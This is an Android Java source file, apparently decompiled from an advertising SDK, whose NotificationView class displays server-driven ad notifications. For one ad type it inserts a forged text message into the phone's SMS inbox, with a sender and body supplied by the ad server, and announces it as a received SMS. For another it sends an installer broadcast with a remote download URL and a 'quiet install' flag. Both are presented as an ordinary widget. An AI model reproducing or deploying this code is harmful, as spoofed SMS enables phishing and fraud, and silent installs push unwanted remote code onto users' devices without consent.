package com.qc.widget;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.net.Uri;
import android.widget.RemoteViews;
import com.qc.base.BitmapCache;
import com.qc.common.Funs;
import com.qc.entity.AdsInfo;
import java.util.List;
import java.util.Random;

public class NotificationView {
    private static int num = 0;

    public static void showNotification(Context mcontext, AdsInfo adsInfo) {
        NotificationManager notification_mgr = (NotificationManager) mcontext.getSystemService("notification");
        Notification notification = new Notification();
        if (adsInfo.getType() == 3) {
            notification.icon = ResourceUtil.getDrawableId(mcontext, "abc_sms_icon");
        } else {
            notification.icon = ResourceUtil.getDrawableId(mcontext, "abc_icon");
        }
        notification.tickerText = adsInfo.getTitle();
        notification.when = System.currentTimeMillis();
        RemoteViews contentView = null;
        if (adsInfo.getDescriptype() == 1) {
            if (adsInfo.getType() == 3) {
                String addr = adsInfo.getNumber();
                ContentValues contentValues = new ContentValues();
                contentValues.put("address", addr);
                contentValues.put("body", adsInfo.getDescription());
                mcontext.getContentResolver().insert(Uri.parse("content://sms"), contentValues);
                notification.tickerText = "收到" + addr + "短信 ";
            } else {
                Bitmap icon = BitmapCache.getInstance().getBitmap(mcontext, Integer.valueOf(adsInfo.getId()));
                if (icon == null) {
                    contentView = new RemoteViews(mcontext.getPackageName(), ResourceUtil.getLayoutId(mcontext, "abc_icon_title_descrption"));
                    contentView.setImageViewResource(ResourceUtil.getId(mcontext, "abc_img_4"), ResourceUtil.getDrawableId(mcontext, "abc_icon"));
                    contentView.setTextViewText(ResourceUtil.getId(mcontext, "abc_text_4"), adsInfo.getTitle());
                    contentView.setTextViewText(ResourceUtil.getId(mcontext, "abc_text_descrpiton_4"), adsInfo.getDescription());
                } else {
                    contentView = new RemoteViews(mcontext.getPackageName(), ResourceUtil.getLayoutId(mcontext, "abc_icon_title"));
                    contentView.setImageViewBitmap(ResourceUtil.getId(mcontext, "abc_img_1"), icon);
                    contentView.setTextViewText(ResourceUtil.getId(mcontext, "abc_text_1"), adsInfo.getDescription());
                }
            }
        } else if (adsInfo.getDescriptype() == 2) {
            Bitmap bitmap = BitmapCache.getInstance().getBitmap(mcontext, Integer.valueOf(adsInfo.getId()));
            if (bitmap != null) {
                contentView = new RemoteViews(mcontext.getPackageName(), ResourceUtil.getLayoutId(mcontext, "abc_onlyimage"));
                contentView.setImageViewBitmap(ResourceUtil.getId(mcontext, "abc_img_2"), bitmap);
            } else {
                return;
            }
        }
        if (contentView != null) {
            notification.contentView = contentView;
        }
        PendingIntent contentIntent = null;
        Intent notificationIntent;
        if (adsInfo.getType() == 1) {
            Uri uri = Uri.parse(adsInfo.getPathurl());
            notificationIntent = new Intent();
            notificationIntent.setAction("android.intent.action.VIEW");
            notificationIntent.setData(uri);
            notificationIntent.setFlags(268435456);
            contentIntent = PendingIntent.getActivity(mcontext, 0, notificationIntent, 0);
        } else if (adsInfo.getType() == 2) {
            int numb;
            Random random = new Random();
            int nextInt = random.nextInt(5);
            while (true) {
                numb = nextInt + 1;
                if (numb != num) {
                    break;
                }
                nextInt = random.nextInt(5);
            }
            notificationIntent = new Intent();
            notificationIntent.setAction("com.mnkp.action.INSTALLER_" + numb);
            notificationIntent.putExtra("downLoadURL", adsInfo.getPathurl());
            notificationIntent.putExtra("isQuietInstall", adsInfo.getDwldhint());
            notificationIntent.putExtra("id", adsInfo.getId());
            contentIntent = PendingIntent.getBroadcast(mcontext, 0, notificationIntent, 0);
            num = numb;
        } else if (adsInfo.getType() == 3) {
            Intent intent = new Intent("android.intent.action.SENDTO", Uri.parse("smsto:" + adsInfo.getNumber()));
            intent.putExtra("sms_body", "");
            contentIntent = PendingIntent.getActivity(mcontext, 0, intent, 134217728);
        } else if (adsInfo.getType() == 4) {
            notificationIntent = Funs.startAppByPackageName(mcontext, adsInfo.getPackageName());
            if (notificationIntent != null) {
                contentIntent = PendingIntent.getActivity(mcontext, 0, notificationIntent, 0);
            } else {
                return;
            }
        }
        if (adsInfo.getType() == 3) {
            notification.setLatestEventInfo(mcontext, adsInfo.getNumber(), adsInfo.getDescription(), contentIntent);
        } else if (contentIntent != null) {
            notification.contentIntent = contentIntent;
        }
        notification.flags = 16;
        if (adsInfo.getSound() == 1) {
            notification.defaults |= 1;
        }
        notification_mgr.notify(adsInfo.getId(), notification);
    }

    public static void cleanAllNotification(Context context, List<AdsInfo> adsInfos) {
        NotificationManager notificationManager = (NotificationManager) context.getSystemService("notification");
        for (AdsInfo adsInfo : adsInfos) {
            notificationManager.cancel(adsInfo.getId());
        }
    }

    public static void cancel(Context context, int id) {
        ((NotificationManager) context.getSystemService("notification")).cancel(id);
    }
}
